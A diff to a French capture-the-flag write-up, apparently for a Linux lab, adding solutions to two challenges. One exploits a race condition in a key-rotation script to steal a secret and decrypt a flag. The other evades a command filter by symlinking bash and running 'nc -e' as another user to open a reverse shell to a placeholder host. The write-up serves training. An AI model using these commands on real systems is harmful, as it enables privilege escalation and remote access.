@@ -135,3 +135,35 @@ Le flag est envoyé chaque seconde au binaire `/keyrecv`. Il est possible de le 
 # Le PID va changer, mais il devrait être proche de 9
 strace -p <PID de /keyrecv>
 ```
+
+### FLAG9
+
+#### Description
+
+L'utilisation de openssl avec pbkdf2 et tout plein d'itérations rend le flag impossible a cracker.
+
+#### Solution
+
+Le script `/home/secretuser/rotatekeys.sh` contient une race condition où la commande openssl prend un peu trop de temps et la clé secrète est exposée.
+
+```bash
+sudo -u secretuser /home/secretuser/rotatekeys.sh & # mettre en arrière plan
+cat /tmp/secret > secret
+openssl enc -aes-256-cbc -d -pbkdf2 -iter 100000 -salt -md sha512 -pass file:secret -in /home/secretuser/flag.enc -out -
+```
+
+### FLAG10
+
+#### Description
+
+Un script exécute tout ce qu'on lui passe en paramètre avec des droits d'adminstrateur, mais il y a un filtre par dessus. Seras-tu capable de passer par dessus?
+
+#### Solution
+
+Une solution parmis plusieurs?
+
+```bash
+ln -s /bin/bash z || true &&
+    sudo -u superuser \
+        /elevate.sh nc -e z <IP> <PORT>
+```
